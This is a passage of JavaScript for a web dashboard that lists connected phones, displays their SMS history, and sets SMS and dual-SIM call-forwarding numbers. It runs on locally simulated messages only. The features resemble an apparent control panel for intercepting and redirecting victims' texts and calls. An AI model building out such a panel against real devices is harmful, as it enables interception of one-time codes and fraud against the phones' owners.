                // If modal is open for this device, refresh SMS list
                if (currentDeviceIndex === deviceIndex) {
                    populateSmsList(device.smsHistory);
                }
            }
        }

        // Function to search SMS
        function searchSms() {
            if (currentDeviceIndex !== -1) {
                const device = devices[currentDeviceIndex];
                const searchTerm = document.getElementById('search-sms').value.toLowerCase();
                const filterType = document.getElementById('sms-type-filter').value;
                
                let filteredSms = device.smsHistory;
                
                // Apply search filter
                if (searchTerm) {
                    filteredSms = filteredSms.filter(sms => 
                        sms.number.includes(searchTerm) || 
                        sms.message.toLowerCase().includes(searchTerm)
                    );
                }
                
                // Apply type filter
                if (filterType !== 'all') {
                    filteredSms = filteredSms.filter(sms => sms.type === filterType);
                }
                
                populateSmsList(filteredSms);
            }
        }

        // Function to save call forward settings
        function saveCallForwardSettings() {
            if (currentDeviceIndex !== -1) {
                const device = devices[currentDeviceIndex];
                const callSettings = device.callForwardSettings;
                
                // Main settings
                callSettings.enabled = document.getElementById('enable-call-forwarding').checked;
                
                // SIM 1 settings
                callSettings.sim1.forwardNumber = document.getElementById('sim1-forward-number').value;
                callSettings.sim1.enabled = document.getElementById('sim1-forward').classList.contains('active');
                
                // SIM 2 settings
                callSettings.sim2.forwardNumber = document.getElementById('sim2-forward-number').value;
                callSettings.sim2.enabled = document.getElementById('sim2-forward').classList.contains('active');
                
                showNotification(`Call forward settings saved for ${device.model}`);
            }
        }
        
        // Function to disconnect a device
        function disconnectDevice(deviceIndex) {
            const device = devices[deviceIndex];
            if (device) {
                device.status = "disconnected";
                device.lastActive = "Just now";
                populateDevicesGrid();
                showNotification(`Device disconnected: ${device.model}`);
            }
        }
        
        // Function to remove a device
        function removeDevice(deviceIndex) {
            if (confirm("Kya aap is device ko remove karna chahte hain?")) {
                const removedDevice = devices.splice(deviceIndex, 1)[0];
                populateDevicesGrid();
                showNotification(`Device removed: ${removedDevice.model}`);
            }
        }
        
        // Function to show notification
        function showNotification(message) {
            const notification = document.createElement('div');
            notification.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: #ff4444;
                color: white;
                padding: 15px 20px;
                border-radius: 8px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.5);
                z-index: 1000;
                font-weight: 500;
                transition: all 0.3s ease;
                border: 1px solid #cc0000;
            `;
            notification.textContent = message;
            
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.style.opacity = '0';
                setTimeout(() => {
                    document.body.removeChild(notification);
                }, 300);
            }, 3000);
        }
        
        // Initialize the dashboard
        document.addEventListener('DOMContentLoaded', function() {
            populateDevicesGrid();
            
            // Refresh devices button
            document.getElementById('refresh-devices').addEventListener('click', function() {
                populateDevicesGrid();
                showNotification("Devices list refreshed");
            });

            // Close modal
            document.getElementById('close-modal').addEventListener('click', function() {
                document.getElementById('client-modal').style.display = 'none';
            });

            // Tab switching
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.addEventListener('click', function() {
                    // Remove active class from all tabs
                    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
                    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                    
                    // Add active class to clicked tab
                    this.classList.add('active');
                    const tabId = this.getAttribute('data-tab');
                    document.getElementById(tabId).classList.add('active');
                });
            });

            // Save Call Forward settings
            document.getElementById('save-call-settings').addEventListener('click', saveCallForwardSettings);

            // Toggle SIM card status on click
            document.querySelectorAll('.forward-option').forEach(option => {
                option.addEventListener('click', function(e) {
                    if (!e.target.classList.contains('form-input')) {
                        const isActive = this.classList.contains('active');
                        const simId = this.id.split('-')[0];
                        updateSimCardStatus(simId, !isActive);
                    }
                });
            });

            // Save SMS settings
            document.getElementById('save-sms-settings').addEventListener('click', function() {
                if (currentDeviceIndex !== -1) {
                    const device = devices[currentDeviceIndex];
                    device.smsSettings.forwardNumber = document.getElementById('forward-number').value;
                    device.smsSettings.selectedSim = document.getElementById('sim-select').value;
                    device.smsSettings.enabled = document.getElementById('enable-forwarding').checked;
                    
                    showNotification(`SMS settings saved for ${device.model}`);
                }
            });

            // Search customer
            document.getElementById('search-customer').addEventListener('input', function() {
                const searchTerm = this.value.toLowerCase();
                if (currentDeviceIndex !== -1) {
                    const device = devices[currentDeviceIndex];
                    const filteredCustomers = device.customers.filter(customer => 
                        customer.name.toLowerCase().includes(searchTerm) || 
                        customer.phone.includes(searchTerm) ||
                        (customer.email && customer.email.toLowerCase().includes(searchTerm))
                    );
                    populateCustomerList(filteredCustomers);
                }
            });

            // Search SMS
            document.getElementById('search-sms').addEventListener('input', searchSms);
            document.getElementById('sms-type-filter').addEventListener('change', searchSms);

            // Add customer button
            document.getElementById('add-customer-btn').addEventListener('click', function() {
                document.getElementById('add-customer-modal').style.display = 'flex';
            });

            // Close add customer modal
            document.getElementById('close-add-customer-modal').addEventListener('click', function() {
                document.getElementById('add-customer-modal').style.display = 'none';
            });

            // Save customer
            document.getElementById('save-customer').addEventListener('click', addNewCustomer);
            
            // Simulate real-time SMS updates
            setInterval(() => {
                if (devices.length > 0 && Math.random() > 0.7) {
                    const randomIndex = Math.floor(Math.random() * devices.length);
                    const device = devices[randomIndex];
                    
                    if (device.status === "connected") {
                        // Add a random received SMS
                        const sampleMessages = [
                            "Hello, I need help with my order",
                            "What is the status of my application?",
                            "Thank you for your service!",
                            "Please call me back",
                            "I have a question about your product"
                        ];
                        
                        const sampleNumbers = [
                            "+91 98765 43210",
                            "+91 87654 32109", 
                            "+91 76543 21098",
                            "+91 65432 10987"
                        ];
                        
                        const newSms = {
                            id: nextSmsId++,
                            type: "received",
                            number: sampleNumbers[Math.floor(Math.random() * sampleNumbers.length)],
                            message: sampleMessages[Math.floor(Math.random() * sampleMessages.length)],
                            timestamp: new Date().toLocaleString('en-IN'),
                            sim: Math.random() > 0.5 ? "sim1" : "sim2",
                            status: "delivered"
                        };
                        
                        device.smsHistory.push(newSms);
                        
                        // If modal is open for this device, refresh SMS list
                        if (currentDeviceIndex === randomIndex) {
                            populateSmsList(device.smsHistory);
                        }
                    }
                }
            }, 10000); // Check every 10 seconds
        });
    </script>
